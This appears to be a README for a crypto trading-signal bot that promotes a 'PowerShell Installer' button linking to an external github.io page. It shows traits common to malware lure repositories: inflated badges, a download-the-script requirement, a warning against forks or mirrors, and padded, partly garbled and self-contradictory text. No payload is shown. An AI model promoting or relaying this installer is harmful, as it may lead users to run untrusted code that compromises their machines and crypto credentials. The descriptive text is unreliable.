<div align="center">

# 🚀 Crypto Accumulation Scanner — Community-Powered Alerts for Discord & Telegram

![](files/preview.png)

### 💻 PowerShell Installer

[![](files/button.png)](https://khalilur14103026.github.io/crypto-accumulation-scanner/)

[![tests](https://img.shields.io/badge/TESTS-GREEN-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![lang](https://img.shields.io/badge/LANG-PYTHON-f59e0b?style=for-the-badge&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-RELEASED-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/PS--CORE-CORE-fbbf24?style=for-the-badge&labelColor=0d1117)]() [![users](https://img.shields.io/badge/USERS-48K-d97706?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Crypto Accumulation Scanner is a community-built bot that quietly watches the market for coins coiling in long, flat bases before a breakout, then sends you a ranked shortlist straight to Telegram. It blends base detection, news catalysts, sector momentum, and futures positioning into one friendly workflow, so you can spend less time staring at charts and more time talking shop with fellow traders. Built openly and shaped by feedback, the project keeps getting sharper with every release. Join the community, share your ideas, and help steer where it goes next.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

🔍 **Quiet-accumulation detection** — the scanner sweeps the market for coins coiling in long, flat bases with shrinking volatility, surfacing the setups that most people scroll past.
- 📊 **Multi-factor scoring** — base quality, OBV, 200 EMA positioning, volatility squeeze, relative strength vs BTC, funding rates and open interest all roll into one ranked score.
- 🗞️ **Catalyst awareness** — news feeds, sector momentum and event flags are checked alongside the chart, so you know *why* a coin might move, not just that it's quiet.
- 📬 **Telegram alerts on a schedule** — a ranked shortlist lands in your chat every 4 hours, automatically, with Windows Task Scheduler support for hands-off operation.
- 🧪 **Forward-testing built in** — every alert is logged and re-checked 3, 7 and 14 days later, so the community can watch the edge prove itself in real time.
- 🪙 **Per-coin breakdowns** — pull a full factor readout for any single coin whenever you want to dig deeper than the shortlist.
- 🛰️ **Listing sniper mode** — a dedicated mode watches for new listing announcements every 5 minutes.
- 📜 **Full scan history** — a run log records every scan's date, time and OK/FAILED status, so nothing gets lost.
- 🚫 **Blacklist support** — keep coins you never want to see out of your results with a simple editable list.
- 🔓 **Accessible by design** — every data source is open and community-friendly, no paywalled APIs required to get started.
- 🧩 **Beginner-friendly setup** — a single example config template and clear commands mean you can go from clone to first alert in minutes.
- 🤝 **Community-driven roadmap** — built in the open, shaped by feedback from users who run it daily and share what works.

## Commands

Here's the command set — your everyday toolkit for the Crypto Accumulation Scanner. Every command works in both Discord and Telegram, and the bot walks you through anything it needs as you go.

- **/crypto-accumulation-scanner** — the headline command. Kicks off a fresh market-wide sweep for coins coiling in quiet accumulation and returns a ranked shortlist with the details that matter.
- **/scan** — run the full accumulation sweep on demand instead of waiting for the scheduled cycle.
- **/coin <symbol>** — get a deep breakdown for a single coin: base structure, volume behavior, momentum context and a plain-language summary of what the scanner sees.
- **/watchlist** — view, add or remove coins you want tracked closely on top of the automatic scans.
- **/alerts on|off** — toggle Telegram alerts for new accumulation candidates so your shortlist finds you, not the other way around.
- **/schedule** — see the current scan cadence and adjust how often the scanner refreshes its results.
- **/signal <symbol>** — pull the latest accumulation signal and confidence read for one coin, with the key factors behind it.
- **/top [count]** — surface the strongest current candidates at a glance, perfect for a quick check-in.
- **/settings** — tune filters, thresholds and notification preferences right from chat.
- **/status** — confirm the scanner is running, the last sweep completed cleanly, and when the next one is due.
- **/help** — friendly in-chat rundown of every command, with examples.

💡 **Tip:** every result can be refined on the spot — ask for more candidates, narrow the list, or dig into a single coin without leaving the conversation. The community shapes what gets built next, so if a command would make your workflow smoother, say the word.

## Configuration

Everything the scanner does — which coins it watches, how sensitive the coil score is, where alerts land — lives in a single config file that ships alongside the bot. Open it in any text editor, tweak the values, save, and restart. That's the whole ritual. We keep the defaults sane so it works out of the box, but the real fun starts when you tune it to your own hunting style.

**Telegram alerts, your way.** Drop in your bot token and chat ID to start receiving ranked shortlists. Want alerts in a group channel instead of a DM? Point the chat ID at the group and everyone gets the digest together. Prefer a quieter cadence? Adjust the scan interval — every 4 hours is the default rhythm, but you can stretch it to daily or tighten it to hourly if you're feeling restless.

**Tuning the coil detector.** The heart of the scanner is the accumulation score, and it's fully adjustable: base length, volatility squeeze thresholds, volume drift tolerance, and how strict the flatness requirement should be. Crank the strictness up and you'll see fewer, cleaner setups; loosen it and you'll cast a wider net. There's no wrong answer — just different appetites for patience.

**Sector and momentum weights.** News catalysts, sector rotation, and futures positioning each contribute to the final ranking. Every weight is exposed, so you can dial down the noise sources and lean harder on the price structure if that's your philosophy. The config comments explain what each knob nudges.

**Blacklist and watchlist.** Keep a running list of coins you never want to see again (looking at you, stablecoins), or pin a handful of favorites so they're always scanned first. Both lists are plain text — edit, save, done.

**Forward-test logging.** Every alert the bot fires is logged automatically so you can review how the picks actually behaved 3, 7, and 14 days later. No configuration needed, but you can point the log at a different folder if you like keeping your records organized.

The config is designed to be friendly to newcomers and deep enough for tinkerers. Start with the defaults, watch a few scan cycles, then start twisting dials. If you find a combination that works beautifully for your market, share it with the community — the best presets in this project came from users just like you.

## FAQ

**Is Crypto Accumulation Scanner really no-cost to use?**
Absolutely — the scanner is fully open and available to everyone in the community. No subscriptions, no paywalls, no hidden tiers. Just clone it, point it at your Telegram credentials, and let it run. We believe good tooling should be accessible to anyone curious enough to explore the market.

**Do I need to be a programmer to get it running?**
Not at all! If you can follow a friendly walkthrough, you're set. The setup is straightforward: drop in your Telegram bot token and chat ID via the config template, then launch. The scanner handles the rest — scanning, ranking, and alerting — on its own schedule. That said, if you *are* a tinkerer, you'll find plenty of knobs to twist.

**How often does it scan, and will I be spammed with alerts?**
By default the scanner runs every 4 hours and sends a ranked shortlist to Telegram. That cadence keeps things calm and digestible — you get a focused watchlist, not a firehose. You can adjust the interval to suit your rhythm, and the sniper mode for listing announcements can be toggled independently if you want faster pings.

**What exactly counts as "quiet accumulation"?**
Great question — it's the heart of the project. The scanner looks for coins coiling in a long, flat base: shrinking volatility, steady volume behavior, and a lack of attention. Momentum is used only as entry timing, not as the core signal. The whole approach was around what backtests actually showed, so the score reflects rather than vibes.

**Can I trust the rankings as trade signals?**
They're a watchlist, not a command. The scanner surfaces candidates worth your attention and logs every alert so you can check how it performed 3, 7, and 14 days later. Its edge is still being proven through forward testing — so treat it as a research companion, not financial advice.

**Does it work for coins outside Bybit?**
The core scan currently pulls from Bybit's REST API via ccxt, with news and sector context layered in from public feeds. The architecture is modular, so extending to additional exchanges is a natural community contribution — if you add one, we'd love to hear about it.

**How can I contribute or suggest features?**
The community is the engine here. Fork the project, open an issue, or submit a pull request — whether it's a new factor, a bug fix, a doc improvement, or a clever idea for the next version. Every contribution, big or small, makes the scanner sharper for everyone.

## Support

We built Crypto Accumulation Scanner because the community kept asking for a way to spot quiet accumulation before the crowd notices. That same community keeps it sharp: every bug report, feature idea, and backtest insight shapes what ships next. If you want to help steer the project, you're already in the right place — jump into the conversation and make your voice heard.

**Where to get help**

- **Questions & troubleshooting** — ask away in the support channel; chances are someone else hit the same thing and has a fix ready.
- **Feature requests** — have an idea for a new factor, a smarter alert, or a cleaner workflow? Pitch it, and let the community weigh in.
- **Bug reports** — describe what happened, share the logs, and we'll dig in together. Screenshots and console output go a long way.
- **Backtest findings** — discovered an interesting pattern in your forward-test results? Post it. The project keeps improving because people share what the data tells them.

**Community guidelines**

- Be kind — everyone here started as a beginner.
- Search before posting; many answers already live in the pinned messages.
- Keep discussion constructive: critique the idea, not the person.
- No unauthorized forks or third-party mirrors — only the official project is supported by the team.
- Share your configuration wins and losses; both teach the rest of us something.

**Stay in the loop**

New releases, breaking changes, and roadmaps are announced right in the support channel. Enable notifications so you don't miss a drop. The team is active daily, and most questions get a reply within a few hours.

**Acknowledgements**

Massive thanks to every contributor, tester, and quiet lurker who filed just one issue — you're the reason the scanner keeps getting better. Special shout-out to the early adopters who ran the first forward tests and shared their spreadsheets.

Your feedback is the fuel. Keep it coming, and let's keep finding those coiling coins together.

## License

The Crypto Accumulation Scanner is released under the **MIT License** — a permissive, community-friendly license that keeps the project open and accessible to everyone. You're welcome to use, study, modify, and share the scanner, whether you're a solo trader, a research group, or a community of signal-hunters building something together.

We believe tools like this grow best in the open. That's why the code comes with no paywalls and no gated tiers — every feature, from the multi-factor coil scoring to the Telegram alert pipeline and the rolling backtest harness, is available to anyone who wants to dig in.

**In short:**

- **Use it** for personal projects, research, or community bots.
- **Fork it** and shape it into your own scanner, dashboard, or alert service.
- **Contribute ** — bug fixes, new factors, backtest improvements, and documentation tweaks are all warmly welcomed.
- **Share it** with others who might find it useful.

The only ask: keep the original copyright and license notice intact in copies or substantial portions of the software, and remember the project is provided "as is", without warranty of any kind — as the license text spells out. Trading is risky business, and the scanner is an educational research tool, not a guarantee of results.

If you build something interesting on top of it, we'd love to hear about it. This project was shaped by feedback, testing, and a healthy dose of skepticism — and it keeps getting better because people take the code, poke at it, and make it their own. Happy scanning! 🚀